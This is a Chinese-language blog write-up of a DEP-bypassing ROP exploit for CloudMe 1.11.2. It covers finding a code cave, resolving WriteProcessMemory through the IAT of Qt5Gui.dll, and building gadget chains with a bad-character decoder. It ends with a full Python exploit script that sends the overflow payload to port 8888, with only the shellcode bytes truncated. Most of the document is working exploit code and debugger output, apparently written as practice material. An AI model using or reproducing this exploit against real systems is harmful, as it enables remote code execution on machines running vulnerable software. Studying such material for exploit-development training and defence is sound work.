---
title: ROP with DEP bypass - CloudMe 1.11.2
description: DEP bypass ROP WriteUp, ROP decoder is so hard.
date: 2025-12-14 02:00:00+0000
categories:
  - ROP
---

## 🦉0x00 前言

Hi，我希望你已經看過 syncbreezeent v10.0.28 的 ROP with DEP bypass 了。我在那一篇 WriteUp 中非常詳細的說明了 ROP 的過程。如果你還沒看過，非常推薦你去看看。至於這一篇 WriteUp 會非常簡短扼要，基本上我不會過多描述為什麼我要這樣做，如果你正好在練習這一題 ROP，只是需要找一個參考，我想這一篇 blog 會非常適合你。但如果你是想從頭學習 ROP，這一篇 blog 可能沒辦法幫助你太多。

---
## 🦉0x01 尋找 Code Cave

有兩種方法找 base address，選一個喜歡的。
```shell
!address Qt5Gui
Base Address:           61b40000
```

```shell
lm m Qt5Gui
start    end        module name
61b40000 62136000   Qt5Gui     (deferred)
```

尋找 SECTION，SECTION 起始點是 `base address + virtual address`，結束點是 `base address + virtual address + virtual size`。
```shell
!dh Qt5Gui

SECTION HEADER #1
   .text name
  44A0E0 virtual size
    1000 virtual address
  44A200 size of raw data
     400 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
60500060 flags
         Code
         Initialized Data
         16 byte align
         Execute Read
```

確認 protect 狀態是否可以寫入。
```shell
!vprot 61b40000 + 1000 + 44A0E0 + 100

BaseAddress:       61f8b000
AllocationBase:    61b40000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
```

確認是否都是 `0x00` 才能當作 Code Cave。
```shell
dd 61b40000 + 1000 + 44A0E0 + 100
dd 61b40000 + 1000 + 44A0E0 + 800
```

確認 Code Cave 的 address。
```shell
? 61b40000 + 1000 + 44A0E0 + 100
Evaluate expression: 1643688416 = 61f8b1e0
```

---
## 🦉0x02 尋找 lpNumberOfBytesWritten

找 .data 區段。
```shell
!dh Qt5Gui

SECTION HEADER #2
   .data name
    29B0 virtual size
  44C000 virtual address
    2A00 size of raw data
  44A600 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
C0600040 flags
         Initialized Data
         32 byte align
         Read Write
```

```
dd Qt5Gui + 44C000 + 29B0 + 4 L4
61f8e9b4  00000000 00000000 00000000 00000000
```

確認 protect 狀態是否可以寫入。
```
0:000> !vprot Qt5Gui + 44C000 + 29B0 + 4

BaseAddress:       61f8e000
AllocationBase:    61b40000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000008  PAGE_WRITECOPY
Type:              01000000  MEM_IMAGE
```

```
?Qt5Gui + 44C000 + 29B0 + 4
Evaluate expression: 1643702708 = 61f8e9b4
```

---
## 🦉0x03 尋找 WPM 在 IAT 的 address

找 IAT 的 offset。
```shell
!dh -f Qt5Gui

5CB000
```

抓一個倒楣鬼算 WPM 的 address。
```
dds Qt5Gui + 5CB000
6210b068  77874030 KERNEL32!GetLastErrorStub
```

算 offset。
```
? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub
Evaluate expression: -129696 = fffe0560
```

爬 IAT 確認看倒楣鬼真正的 address。
```
u KERNEL32!GetLastErrorStub

KERNEL32!GetLastErrorStub:
77874030 ff25d4b38d77    jmp     dword ptr [KERNEL32!_imp__GetLastError (778db3d4)]
```

算 WPM address。
```
0:000> ? 77874030 + 0n129696 
Evaluate expression: 2005482192 = 77893ad0
```

確定是 WPM。
```shell
u 77893ad0

KERNEL32!WriteProcessMemoryStub:
77893ad0 8bff            mov     edi,edi
77893ad2 55              push    ebp
77893ad3 8bec            mov     ebp,esp
77893ad5 5d              pop     ebp
```

先捏出 writeprocessmemory 的骨架。
```python
wpm=pack("<L",0x69696969)   # (Todo) WriteProcessMemory Address
wpm+=pack("<L",0x61f8b1e0)  # Return Address after WPM
wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
wpm+=pack("<L",0x61f8b1e0)  # lpBaseAddress, Code Cave
wpm+=pack("<L",0x70707070)  # (Todo) lpBuffer
wpm+=pack("<L",0x71717171)  # (Todo) nSize, 0x700
wpm+=pack("<L",0x61f8e9b4)  # *lpNumberOfBytesWritten, .data
```

---
## 🦉0x04 ROP

找 libspp 的 base address。
```shell
.load narly
!nmod

61b40000 62136000 Qt5Gui
```

用 rp-win32 來取得 gadget。
```shell
C:\Users\tonya\Desktop\ROP\rp-win32.exe -r 5 --va 0x61b40000 --file "C:\Users\tonya\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll" > rop5.txt
```

先把 esp 記錄下來。
```python
eip = pack("<L",0x61bd3efe) # push esp ; pop ebx ; pop esi ; ret ;
filler = b'D' * 4
```

透過 esp 取得 stack 的範圍。
```shell
r esp
!address esp

Base Address:           00a33000
End Address:            00a40000
```

搜尋該範圍中 WPM 的佔位字元。
```shell
s -b a33000 a40000 69 69 69 69
00a3aa10
```

計算 offset，WPM 的佔位離 `ebx` `0x20` 遠，如果要到 WPM 的佔位字元，要從 `esp - 0x20`
```shell
? ebx - a3aa10

Evaluate expression: 32 = 00000020
```

第一部分 ROP，指到 WriteProcessMemory Address，放 `edx` 備用。
```python
print("[+] Get skeleton of WPM Address & put into edx")
rop  = pack("<L",0x61dcd833) # xchg eax, ebx ; ret ;
rop += pack("<L",0x61f05942) # pop ecx ; ret ;
rop += pack("<L",0xffffffe0) # -32
rop += pack("<L",0x61d7a3b7) # add eax, ecx ; ret ;
rop += pack("<L",0x61f2735a) # xchg eax, edx ; ret ;
```

第二部分 ROP，準備好 `-129696`，是從 GetLastErrorStub 到 WriteProcessMemoryStub 的差值，放 `ecx` 備用。
```python
print("[+] Put GetLastErrorStub-WriteProcessMemoryStub into ecx")
rop += pack("<L",0x61f05942) # pop ecx ; ret ;
rop += pack("<L",0xfffe0560) # -129696
```

第三部分 ROP，準備好 GetLastErrorStub 的 IAT address，由於是指標，所以要取出當中真正的 address，放到 skeleton 最頂部。
```python
print("[+] Put WPM Address into skeleton")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0x6210b068) # GetLastErrorStub
rop += pack("<L",0x61bd51e2) # mov eax,  [eax] ; ret ;
rop += pack("<L",0x61c49e73) # sub eax, ecx ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;
```

此時的 ROP 應該已經完成這些部分，由於後面的 Return Address、hProcess、lpBaseAddress 都是硬編碼，因此直接跳過。
```python
wpm=pack("<L",0xXXXXXXXX)   # (Done) WriteProcessMemory Address
wpm+=pack("<L",0x61f8b1e0)  # Return Address after WPM   
wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
wpm+=pack("<L",0x61f8b1e0)  # lpBaseAddress, Code Cave
wpm+=pack("<L",0x70707070)  # (Todo) lpBuffer
wpm+=pack("<L",0x71717171)  # (Todo) nSize, 0x700
wpm+=pack("<L",0x61f8e9b4)  # *lpNumberOfBytesWritten, .data
```

第四部份 ROP，跳過那些硬編碼的部分，讓 edx 指向 lpBuffer。
```python
print("[+] Move edx to skeleton of lpBuffer")
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
```

確認已經就定位到 lpBuffer。
```shell
dd edx L1
00a3aa20  70707070
```

計算 skeleton 的 lpBuffer 距離 shell code 有多遠，先取得目前的 edx。
```shell
!address edx
```

查看當前的 stack 範圍，搜尋 shellcode 前 3 bytes。
```shell
s -b 00a33000 00a40000 fc e8 82
00a3acfc
```

計算 offset，會隨著 ROP gadgets 堆疊而改變，後面需要再回來修正。
```shell
0:000> ? 00a3acfc -edx
Evaluate expression: 732 = 000002dc
```

確認 shellcode 的位置正確。
```
dd edx+0n732 L1
00a3acfc  0182e8fc
```

第五部分 ROP，計算 edx 距離 shell code 有多遠，並且將 shell code 所在的 address 寫入 lpBuffer，之後 WPM 會從這個 address 把 shell code 寫入 Code Cave。時空旅人從未來回來，offset 在這裡變成 `204` 了。

```shell
0:000> ? -0n204
Evaluate expression: -732 = fffffd24
```

```python
print("[+] Put shellcode address to skeleton of lpBuffer")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xffffff34) # -204
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;
```

第六部份 ROP，讓 edx 指向 nSize。
```python
print("[+] Move edx to skeleton of nSize")
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
```

第七部分 ROP，把 nSize 放進去 skeleton 的 nSize。
```shell
0:011> ? -0n700
Evaluate expression: -700 = fffffd44
```

```python
print("[+] Put shell code size to skeleton of nSize")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xfffffd44) # 700
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;
```

第八部分 ROP，把 shell code 的開始位置放在 ebx。這裡挑戰了一下極限，使用了 decoder 來解決 shell code 的 badchar。以後不敢了。
```python
print("[+] Put shell code start address to ebx")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xfffffd28) # -728
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61dcd833) # xchg eax, ebx ; ret ;
```

開始迴圈 decoder，總之就是移動一段距離，修值，再移動一段距離，修值，重複這個行為。
```python
for distance in badchar_locate_distance_list:
    rop += pack("<L",0x61b94fc5)    # pop eax ; ret ;
    rop += pack("<L",neg(distance)) # distance
    rop += pack("<L",0x61eed92a)    # neg eax ; ret ;
    rop += pack("<L",0x61cbd77e)    # add ebx, eax ; xor eax, eax ; ret ;
    rop += pack("<L",0x61b94fc5)    # pop eax ; ret ;
    rop += pack("<L",0xffffffff)    # -1
    rop += pack("<L",0x61defd81)    # add byte [ebx], al ; ret ;
```

第九部分 ROP，將 skeleton 頂端的 address 放入 `esp` 中執行 WPM，可以用 `edx` 去找，但也能算，前面總共對 `edx` 動了 `20` 次，所以就減去 `0x14`。

```shell
0:000> dd edx-14 L4
00a3aa10  77893ad0 61f8b1e0 ffffffff 61f8b1e0
```

```shell
print("[+] Set esp to WPM")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xffffffec) # -20
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61bf84c0) # xchg eax, esp ; ret ;
```

最後記得回去修  lpBuffer。

---
## 🦉0x05 範例 Payload

```python
from struct import pack
import socket

###################################################################

def neg(i):
    return 0x100000000 - i

badchar_locate_list = []
badchar_locate_distance_list = []

def encoder(sh):
    shellcode = bytearray(sh)
    
    for c in range(len(shellcode)):
        if shellcode[c] in [ord(i) for i in [b'\x00',b'\x0a', b'\x0d', b'\x25', b'\x26', b'\x2b', b'\x3d']]:
            # CHANGE HERE
            # shellcode[c] = (shellcode[c] + 1) & 0xFF  
            shellcode[c] = shellcode[c] + 1
            badchar_locate_list.append(c)

    # print(badchar_locate_list)

    for i in range(len(badchar_locate_list)):
        if i == 0:
            badchar_locate_distance_list.append(badchar_locate_list[0])
        else:
            badchar_locate_distance_list.append(badchar_locate_list[i] - badchar_locate_list[i-1])

    return shellcode
    # print(badchar_locate_distance_list)


###################################################################


badchars = [0x00]

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  # vulnserver

shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00..."
shellcode = encoder(shellcode)

print(len(shellcode))

crash_offset  = 1052

wpm=pack("<L",0x69696969)   # WriteProcessMemory Address
wpm+=pack("<L",0x61f8b1e0)  # Return Address after WPM
wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
wpm+=pack("<L",0x61f8b1e0)  # lpBaseAddress, Code Cave
wpm+=pack("<L",0x70707070)  # lpBuffer
wpm+=pack("<L",0x71717171)  # nSize
wpm+=pack("<L",0x61f8e9b4)  # *lpNumberOfBytesWritten, .data

junk = b'A' * (crash_offset-len(wpm))
eip = pack("<L",0x61bd3efe) # push esp ; pop ebx ; pop esi ; ret ;
filler = b'D' * 4           # garbage for pop esi;

print("[+] Get skeleton of WPM Address & put into edx")
rop  = pack("<L",0x61dcd833) # xchg eax, ebx ; ret ;
rop += pack("<L",0x61f05942) # pop ecx ; ret ;
rop += pack("<L",0xffffffe0) # -32
rop += pack("<L",0x61d7a3b7) # add eax, ecx ; ret ;
rop += pack("<L",0x61f2735a) # xchg eax, edx ; ret ;

print("[+] Put GetLastErrorStub-WriteProcessMemoryStub into ebx")
rop += pack("<L",0x61f05942) # pop ecx ; ret ;
rop += pack("<L",0xfffe0560) # -129696

print("[+] Put WPM Address into skeleton")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0x6210b068) # GetLastErrorStub
rop += pack("<L",0x61bd51e2) # mov eax,  [eax] ; ret ;
rop += pack("<L",0x61c49e73) # sub eax, ecx ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;

print("[+] Move edx to skeleton of lpBuffer")
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;

print("[+] Put shellcode address to skeleton of lpBuffer")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xfffffd24) # -732
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;

print("[+] Move edx to skeleton of nSize")
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;
rop += pack("<L",0x61b455fa) # inc edx ; ret ;

print("[+] Put shell code size to skeleton of nSize")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xfffffd44) # 700
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61f2b0d3) # mov  [edx], eax ; ret ;


rop += pack("<L",0x61b4157e)  # ret ;

print("[+] Put shell code start address to ebx")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xfffffd28) # -728
rop += pack("<L",0x61eed92a) # neg eax ; ret ;
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61dcd833) # xchg eax, ebx ; ret ;

for distance in badchar_locate_distance_list:
    rop += pack("<L",0x61b94fc5)    # pop eax ; ret ;
    rop += pack("<L",neg(distance)) # distance
    rop += pack("<L",0x61eed92a)    # neg eax ; ret ;
    rop += pack("<L",0x61cbd77e)    # add ebx, eax ; xor eax, eax ; ret ;
    rop += pack("<L",0x61b94fc5)    # pop eax ; ret ;
    rop += pack("<L",0xffffffff)    # -1
    rop += pack("<L",0x61defd81)    # add byte [ebx], al ; ret ;


rop += pack("<L",0x61b4157e)  # ret ;

print("[+] Set esp to WPM")
rop += pack("<L",0x61b94fc5) # pop eax ; ret ;
rop += pack("<L",0xffffffec) # -20
rop += pack("<L",0x61c59bdd) # add eax, edx ; ret ;
rop += pack("<L",0x61bf84c0) # xchg eax, esp ; ret ;

payload = junk + wpm + eip + filler + rop + shellcode
crash = 2000  # change me
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    print(f"sent {sent} bytes")
```
